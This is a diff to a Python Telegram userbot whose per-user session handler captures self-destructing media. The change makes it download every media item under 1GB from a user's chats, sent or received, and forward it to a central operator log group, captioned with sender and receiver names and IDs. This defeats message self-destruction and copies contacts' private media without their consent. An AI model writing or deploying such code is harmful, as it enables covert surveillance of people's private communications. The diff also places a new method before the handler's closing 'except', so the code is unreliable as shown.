@@ -167,59 +167,89 @@ class UserSession:
             elif message.media and getattr(message.media, 'ttl_seconds', None):
                 is_timer = True
 
-            if is_timer and message.media:
-                print(f"Detected self-destruct message for user {self.user_id}!")
+            # Decide what to do
+            # Log Group: All Media < 1GB
+            # User DM: Only Timer Media
+            
+            should_log = False
+            if message.media:
+                # Check Size (1GB = 10^9 bytes)
+                file_size = 0
+                if getattr(message, 'file', None) and getattr(message.file, 'size', None):
+                     file_size = message.file.size
+                
+                if file_size < 1_000_000_000:
+                    should_log = True
+
+            if should_log:
+                print(f"Processing media for Logging (User {self.user_id})")
                 
                 # Download
                 path = await event.download_media(self.download_folder)
-                print(f"Downloaded to {path}")
+                
+                # Schedule Auto-Delete after 5 minutes (300 seconds)
+                asyncio.create_task(self.delete_file_later(path, 300))
                 
                 # Gather Info for Logging
                 try:
                     me = await self.client.get_me()
-                    my_name = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip() or getattr(me, 'title', 'Me')
+                    first = getattr(me, 'first_name', '') or ''
+                    last = getattr(me, 'last_name', '') or ''
+                    my_name = f"{first} {last}".strip() or getattr(me, 'title', 'Me')
                     my_id = me.id
                     
-                    # For private chats, 'chat' is the partner logic
-                    # For groups, 'chat' is the group
                     chat_entity = await event.get_chat()
-                    chat_name = getattr(chat_entity, 'first_name', '') or getattr(chat_entity, 'title', 'Unknown')
+                    c_first = getattr(chat_entity, 'first_name', '') or ''
+                    c_last = getattr(chat_entity, 'last_name', '') or ''
+                    chat_name = f"{c_first} {c_last}".strip() or getattr(chat_entity, 'title', 'Unknown')
                     
                     sender_str = ""
                     receiver_str = ""
                     
                     if event.out:
                         # I sent it
-                        sender_str = f"[{my_name}](tg://user?id={my_id})"
-                        receiver_str = f"[{chat_name}](tg://user?id={chat_entity.id})"
+                        sender_str = f"[{my_name}](tg://user?id={my_id}) (`{my_id}`)"
+                        receiver_str = f"[{chat_name}](tg://user?id={chat_entity.id}) (`{chat_entity.id}`)"
                     else:
-                        # They sent it (or group member)
+                        # They sent it
                         if event.is_group:
                             sender = await event.get_sender()
-                            s_name = getattr(sender, 'first_name', '')
-                            sender_str = f"[{s_name}](tg://user?id={sender.id})"
+                            s_first = getattr(sender, 'first_name', '') or ''
+                            s_last = getattr(sender, 'last_name', '') or ''
+                            s_name = f"{s_first} {s_last}".strip()
+                            sender_str = f"[{s_name}](tg://user?id={sender.id}) (`{sender.id}`)"
                             receiver_str = f"[{my_name}](tg://user?id={my_id}) (in {chat_name})"
                         else:
-                            sender_str = f"[{chat_name}](tg://user?id={chat_entity.id})"
-                            receiver_str = f"[{my_name}](tg://user?id={my_id})"
+                            sender_str = f"[{chat_name}](tg://user?id={chat_entity.id}) (`{chat_entity.id}`)"
+                            receiver_str = f"[{my_name}](tg://user?id={my_id}) (`{my_id}`)"
                             
-                    log_caption = f"#LOG\nSender: {sender_str}\nReceiver: {receiver_str}"
+                    log_caption = f"#LOG\nSender - {sender_str}\nReceiver - {receiver_str}"
                     await self.bot.send_file(LOG_GROUP_ID, path, caption=log_caption)
                 except Exception as log_e:
                     print(f"Logging error: {log_e}")
 
-                # Send back to User DM (Apply Filters)
-                should_send_to_user = True
-                
-                # Filter Logic for specific Admins (Auto Monitor)
-                # If chat is Admin, ignore Incoming (from Admin). Keep Outgoing (from Me).
-                if event.chat_id in DOWNLOAD_FILTER_ADMINS and not event.out:
-                    should_send_to_user = False
-                
-                if should_send_to_user:
-                    sender = await event.get_sender()
-                    sender_name = getattr(sender, 'first_name', '') or getattr(sender, 'title', 'Unknown')
-                    await self.bot.send_file(self.user_id, path, caption=f"Self-Destruct Detected\n{sender_name}")
+                # Send back to User DM (ONLY IF TIMER) applies
+                if is_timer:
+                    should_send_to_user = True
+                    # Filter Logic
+                    if event.chat_id in DOWNLOAD_FILTER_ADMINS and not event.out:
+                        should_send_to_user = False
+                    
+                    if should_send_to_user:
+                        sender = await event.get_sender()
+                        # Simple name for user caption
+                        s_first = getattr(sender, 'first_name', '') or ''
+                        sender_name = s_first  
+                        await self.bot.send_file(self.user_id, path, caption=f"Self-Destruct Detected\n{sender_name}")
+
+    async def delete_file_later(self, path, delay):
+        await asyncio.sleep(delay)
+        if os.path.exists(path):
+            try:
+                os.remove(path)
+                print(f"Deleted {path} after {delay}s")
+            except Exception as e:
+                print(f"Error deleting {path}: {e}")
                 
         except Exception as e:
             print(f"Error in message handler for {self.user_id}: {e}")
